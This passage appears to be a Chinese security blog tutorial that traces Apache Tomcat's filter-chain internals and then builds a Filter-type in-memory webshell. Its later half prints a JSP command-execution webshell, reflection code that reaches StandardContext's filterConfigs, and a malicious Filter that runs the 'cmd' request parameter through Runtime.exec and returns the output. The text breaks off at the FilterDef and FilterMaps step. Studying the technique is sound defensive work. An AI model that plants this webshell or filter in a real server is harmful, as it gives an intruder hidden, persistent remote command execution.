+<p>至此，invoke() 部分的所有流程我们都分析完毕了，接着继续往后看，也就是 <code>doFilter()</code> 方法。这个 <code>doFilter()</code> 方法也是由最近的那个 invoke() 方法调用的。如图，我们把断点下过去。如果师傅们这个 invoke() 方法可用的话，可以断点下这里，如果不可用的话可以下到后面的 <code>doFilter()</code> 方法</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n20.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里我们要重点关注前文说过的 filterChain 这个变量</p>
+<p>找到定义它的地方</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n21.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们跟进 createFilterChain() 这个方法。使用 <code>ApplicationFilterFactory.createFilterChain()</code> 创建了一个过滤链，将 <code>request, wrapper, servlet</code> 进行传递</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n22.png" srcset="/img/loading.gif" lazyload></p>
+<p>找ai翻译了一下这段代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;<br>    <span class="hljs-comment">// 如果 servlet 为 null，返回 null</span><br>    <span class="hljs-keyword">if</span> (servlet == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">ApplicationFilterChain</span> <span class="hljs-variable">filterChain</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <span class="hljs-comment">// 声明过滤器链对象</span><br><br>        <span class="hljs-comment">// 如果请求是 Request 类型</span><br>        <span class="hljs-keyword">if</span> (request <span class="hljs-keyword">instanceof</span> Request) &#123;<br>            <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request)request;<br>            <br>            <span class="hljs-comment">// 如果安全性启用，创建一个新的过滤器链</span><br>            <span class="hljs-keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;<br>                filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 否则获取已有的过滤器链，如果没有，则创建新的过滤器链</span><br>                filterChain = (ApplicationFilterChain)req.getFilterChain();<br>                <span class="hljs-keyword">if</span> (filterChain == <span class="hljs-literal">null</span>) &#123;<br>                    filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>                    req.setFilterChain(filterChain);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果请求不是 Request 类型，直接创建新的过滤器链</span><br>            filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>        &#125;<br><br>        <span class="hljs-comment">// 设置过滤器链使用的 servlet</span><br>        filterChain.setServlet(servlet);<br><br>        <span class="hljs-comment">// 设置 servlet 是否支持异步</span><br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br><br>        <span class="hljs-comment">// 获取上下文（StandardContext 是 ServletContext 的实现）</span><br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext)wrapper.getParent();<br><br>        <span class="hljs-comment">// 获取与上下文相关的过滤器映射（FilterMaps）</span><br>        FilterMap[] filterMaps = context.findFilterMaps();<br>        <span class="hljs-keyword">if</span> (filterMaps != <span class="hljs-literal">null</span> &amp;&amp; filterMaps.length != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// 获取请求的分派类型（DispatcherType）</span><br>            <span class="hljs-type">DispatcherType</span> <span class="hljs-variable">dispatcher</span> <span class="hljs-operator">=</span> (DispatcherType)request.getAttribute(<span class="hljs-string">&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;</span>);<br><br>            <span class="hljs-comment">// 获取请求路径</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">requestPath</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">attribute</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;</span>);<br>            <span class="hljs-keyword">if</span> (attribute != <span class="hljs-literal">null</span>) &#123;<br>                requestPath = attribute.toString();<br>            &#125;<br><br>            <span class="hljs-comment">// 获取 servlet 名称</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<br><br>            <span class="hljs-comment">// 遍历所有过滤器映射，匹配 Dispatcher 和请求路径</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; filterMaps.length; ++i) &#123;<br>                <span class="hljs-keyword">if</span> (matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; matchFiltersURL(filterMaps[i], requestPath)) &#123;<br>                    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());<br>                    <span class="hljs-keyword">if</span> (filterConfig != <span class="hljs-literal">null</span>) &#123;<br>                        filterChain.addFilter(filterConfig);  <span class="hljs-comment">// 将匹配的过滤器添加到过滤器链</span><br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 返回创建好的过滤器链</span><br>            <span class="hljs-keyword">return</span> filterChain;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果没有过滤器映射，直接返回已创建的过滤器链</span><br>            <span class="hljs-keyword">return</span> filterChain;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这一段</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; filterMaps.length; ++i) &#123;<br>                <span class="hljs-keyword">if</span> (matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; matchFiltersServlet(filterMaps[i], servletName)) &#123;<br>                    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());<br>                    <span class="hljs-keyword">if</span> (filterConfig != <span class="hljs-literal">null</span>) &#123;<br>                        filterChain.addFilter(filterConfig);  <span class="hljs-comment">// 将匹配的过滤器添加到过滤器链</span><br>                    &#125;<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure>
+
+<p>遍历<code>StandardContext.filterMaps</code>得到filter与URL的映射关系并通过<code>matchDispatcher()</code>、<code>matchFilterURL()</code>方法进行匹配，匹配成功后，还需判断<code>StandardContext.filterConfigs</code>中，是否存在对应filter的实例，当实例不为空时通过<code>addFilter</code>方法，将管理filter实例的<code>filterConfig</code>添加入<code>filterChain</code>对象中</p>
+<p>filterConfig</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> FilterConfig <span class="hljs-title function_">findFilterConfig</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">return</span> (FilterConfig)<span class="hljs-built_in">this</span>.filterConfigs.get(name);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这时候我们再进入 <code>doFilter()</code> 的方法其实是，将请求交给其 pipeline 去处理，由 pipeline 中的所有 valve 顺序处理请求。后续的就是我们前文分析过的 <strong>在访问 &#x2F;filter 之后的流程分析</strong></p>
+<p><strong>createFilterChain方法流程</strong></p>
+<ol>
+<li><strong>方法签名</strong>：<ul>
+<li><code>createFilterChain</code>：创建过滤器链。</li>
+<li>参数：<ul>
+<li><code>ServletRequest request</code>：HTTP 请求对象。</li>
+<li><code>Wrapper wrapper</code>：表示 Servlet 的封装对象。</li>
+<li><code>Servlet servlet</code>：目标 servlet。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>检查 <code>servlet</code> 是否为 <code>null</code></strong>：<ul>
+<li>如果 <code>servlet</code> 为 <code>null</code>，则直接返回 <code>null</code>，否则继续执行。</li>
+</ul>
+</li>
+<li><strong>初始化 <code>filterChain</code></strong>：<ul>
+<li>如果请求对象 <code>request</code> 是 <code>Request</code> 类型，则使用 <code>request</code> 对象中的过滤器链（如果存在）或创建一个新的过滤器链。</li>
+<li>否则，直接创建一个新的 <code>ApplicationFilterChain</code>。</li>
+</ul>
+</li>
+<li><strong>设置 <code>filterChain</code> 的 servlet</strong>：<ul>
+<li>将传入的 <code>servlet</code> 设置为 <code>filterChain</code> 的目标 Servlet。</li>
+</ul>
+</li>
+<li><strong>获取并设置异步支持</strong>：<ul>
+<li>设置 <code>filterChain</code> 是否支持异步请求。</li>
+</ul>
+</li>
+<li><strong>查找并处理过滤器映射</strong>：<ul>
+<li>获取 <code>StandardContext</code>（上下文）中的所有 <code>FilterMap</code>，这些映射定义了请求与过滤器之间的关系。</li>
+<li>根据请求的 <code>DispatcherType</code> 和 <code>requestPath</code>，匹配合适的过滤器映射，并将匹配的过滤器添加到过滤器链中。</li>
+<li>同样的，按照 <code>DispatcherType</code> 和 <code>servletName</code> 进行匹配，添加相应的过滤器。</li>
+</ul>
+</li>
+<li><strong>返回过滤器链</strong>：<ul>
+<li>如果找到了过滤器映射并成功匹配，返回创建好的 <code>filterChain</code>。如果没有找到过滤器映射，返回默认的过滤器链。</li>
+</ul>
+</li>
+</ol>
+<p>总结：</p>
+<p>这段代码的主要作用是根据请求、Servlet 和上下文中的配置信息，创建一个适当的 <code>ApplicationFilterChain</code> 对象，并将符合条件的过滤器（Filter）加入到该链中，最终返回这个过滤器链。这个链会在请求的生命周期中执行。</p>
+<h3 id="小结一下分析流程"><a href="#小结一下分析流程" class="headerlink" title="小结一下分析流程"></a>小结一下分析流程</h3><p>总结一下两个流程</p>
+<h4 id="1-首先是-invoke-方法"><a href="#1-首先是-invoke-方法" class="headerlink" title="1. 首先是 invoke() 方法"></a>1. 首先是 invoke() 方法</h4><p>层层调用管道，在最后一个管道的地方会创建一个链子，这个链子是 FilterChain，再对里头的 filter 进行一些相关的匹配</p>
+<p>Engine-&gt;Host-&gt;Context-&gt;Wrapper</p>
+<h4 id="2-filterchain-拿出来之后"><a href="#2-filterchain-拿出来之后" class="headerlink" title="2. filterchain 拿出来之后"></a>2. filterchain 拿出来之后</h4><p>进行 <code>doFilter()</code> 工作，将请求交给对应的 pipeline 去处理，也就是进行一个 <code>doFilter()</code> —-&gt; <code>internalDoFilter()</code> —-&gt; <code>doFilter()</code>；直到最后一个 filter 被调用。</p>
+<h4 id="3-最后一个-filter"><a href="#3-最后一个-filter" class="headerlink" title="3. 最后一个 filter"></a>3. 最后一个 filter</h4><p>最后一个 filter 会执行完 <code>doFilter()</code> 操作，随后会跳转到 <code>Servlet.service()</code> 这里。至此，流程分析完毕。</p>
+<h4 id="4-小结一下攻击的思路"><a href="#4-小结一下攻击的思路" class="headerlink" title="4. 小结一下攻击的思路"></a>4. 小结一下攻击的思路</h4><p>攻击的代码应该生效在这里</p>
+<p>获取到filterconfig</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n23.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们只需要构造含有恶意的 filter 的 <strong>filterConfig</strong> 和拦截器 <strong>filterMaps</strong>，就可以达到触发目的了，并且它们都是从 StandardContext 中来的</p>
+<p>而这个 filterMaps 中的数据对应 web.xml 中的 filter-mapping 标签</p>
+<p>filterMap中的映射定义了请求与过滤器之间的关系</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span>  </span><br><span class="hljs-tag"> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span><br><span class="hljs-tag"> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span>  </span><br><span class="hljs-tag"> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span>  <br> <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/filter<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>  <br> <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>所以后续的话，我们一定是思考通过某种方式去触发修改它的</p>
+</blockquote>
+<h1 id="Filter型内存马攻击思路分析"><a href="#Filter型内存马攻击思路分析" class="headerlink" title="Filter型内存马攻击思路分析"></a>Filter型内存马攻击思路分析</h1><ul>
+<li>上文我们说到，我们一定是思考通过某种方式去触发修改 filterMaps 的，也就是如何修改 web.xml 中的 filter-mapping 标签。</li>
+</ul>
+<p>filterMaps 可以通过如下两个方法添加数据，对应的类是 <code>StandardContext</code> 这个类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilterMap</span><span class="hljs-params">(FilterMap filterMap)</span> &#123;<br>    validateFilterMap(filterMap);<br>    <span class="hljs-comment">// Add this filter mapping to our registered set</span><br>    filterMaps.add(filterMap);<br>    fireContainerEvent(<span class="hljs-string">&quot;addFilterMap&quot;</span>, filterMap);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilterMapBefore</span><span class="hljs-params">(FilterMap filterMap)</span> &#123;<br>    validateFilterMap(filterMap);<br>    <span class="hljs-comment">// Add this filter mapping to our registered set</span><br>    filterMaps.addBefore(filterMap);<br>    fireContainerEvent(<span class="hljs-string">&quot;addFilterMap&quot;</span>, filterMap);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>StandardContext</code> 这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。</p>
+<p>里面有三个和Filter有关的成员变量：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">filterMaps变量：包含所有过滤器的URL映射关系 <br><br>filterDefs变量：包含所有过滤器包括实例内部等变量 <br><br>filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理<br></code></pre></td></tr></table></figure>
+
+<p>filterConfigs 成员变量是一个HashMap对象，里面存储了filter名称与对应的<code>ApplicationFilterConfig</code>对象的键值对，在<code>ApplicationFilterConfig</code>对象中则存储了Filter实例以及该实例在web.xml中的注册信息。</p>
+<p>filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应<code>FilterDef</code>的对象的键值对，而<code>FilterDef</code>对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据</p>
+<p>filterMaps 中的<code>FilterMap</code>则记录了不同filter与<code>UrlPattern</code>的映射关系</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <br><br><span class="hljs-keyword">private</span> HashMap&lt;String, FilterDef&gt; filterDefs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StandardContext.<span class="hljs-type">ContextFilterMaps</span> <span class="hljs-variable">filterMaps</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardContext</span>.ContextFilterMaps();<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>讲完了一些基础的概念，我们来看一看 ApplicationFilterConfig 里面存了什么东西</li>
+</ul>
+<p>看到我们之前调试的时候分析到的</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n24.png" srcset="/img/loading.gif" lazyload></p>
+<p>它有三个重要的东西：<br>一个是ServletContext，一个是filter，一个是filterDef</p>
+<ul>
+<li>其中filterDef就是对应web.xml中的filter标签</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>从org.apache.catalina.core.StandardContext#filterStart中可以看到filterConfig可以通过filterConfigs.put(name, filterConfig);添加</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n25.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>通过前文分析，得出构造的主要思路如下</p>
+<ol>
+<li>获取当前应用的StandardContext对象</li>
+<li>通过StandardContext对象再获取filterConfigs</li>
+<li>接着实现自定义想要注入的filter对象</li>
+<li>然后为自定义对象的filter创建一个FilterDef</li>
+<li>最后把 ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现</li>
+</ol>
+<p>这一块很多类名都比较像，很容易混淆，总结了一张图</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/Filter%E5%86%85%E5%AD%98%E9%A9%AC.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Filter内存马的实现"><a href="#Filter内存马的实现" class="headerlink" title="Filter内存马的实现"></a>Filter内存马的实现</h1><p>先看一下有回显的木马</p>
+<p>实际上就是比无回显多了一个输入输出的工作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;% <span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)!=<span class="hljs-literal">null</span>)&#123;<br>    java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>    out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>    <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>        out.print(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>    &#125;<br>    out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br> <br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>我们之后就是要将此木马配置成恶意filter，再注入到内存中</p>
+<p>在现实情况中需要动态的将该 Filter 给添加进去</p>
+<p>由前面<strong>Filter实例存储分析</strong>得知 <code>StandardContext</code> Filter实例存放在filterConfigs、filterDefs、filterConfigs这三个变量里面，将fifter添加到这三个变量中即可将内存马打入。</p>
+<p>构造流程</p>
+<p><img src="/img/%E5%86%85%E5%AD%98%E9%A9%AC/n26.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一步需要获取StandardContext对象，联想到之前构造CC链EXP的过程，首先想到的是反射获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <br> appctx.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <br> stdctx.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);  <br>  <br>  <br>  <br> <span class="hljs-type">String</span> <span class="hljs-variable">FilterName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cmd_Filter&quot;</span>;  <br> Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);  <br> Configs.setAccessible(<span class="hljs-literal">true</span>);  <br> filterConfigs = (Map) Configs.get(standardContext); <br></code></pre></td></tr></table></figure>
+
+<p>定义一个Filter，将有回显的木马写进去</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;  <br>  <br>                    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;  <br>  <br>                    &#125;  <br>  <br>                    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;  <br>                        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;  <br> <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>)&#123;  <br>  <br>                            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();  <br><span class="hljs-comment">//  </span><br> <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);  <br> <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;  <br> servletResponse.getWriter().write(output);  <br>  <br> <span class="hljs-keyword">return</span>; &#125;  <br>                        filterChain.doFilter(servletRequest,servletResponse);  <br> &#125;  <br>  <br>                    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;  <br>  <br>                    &#125;  <br>                &#125;;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>再设置 FilterDef 和 FilterMaps</li>
+</ul>
+<p>filterMap是映射关系，filterDef是filter-name和filter-class</p>
+<p>依旧是利用反射进行获取和修改</p>
